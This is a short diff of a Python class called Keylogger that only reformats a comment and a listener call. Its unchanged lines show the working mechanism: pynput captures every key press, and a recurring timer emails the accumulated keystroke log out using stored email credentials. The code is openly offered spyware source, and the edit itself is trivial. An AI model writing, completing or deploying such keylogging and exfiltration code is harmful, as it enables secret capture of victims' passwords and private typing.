@@ -26,7 +26,7 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def report(self):
-        #print (self.log)
+        # print (self.log)
         self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
@@ -40,8 +40,7 @@ class Keylogger:
         server.quit()
 
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(
-            on_press=self.process_key_press)
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
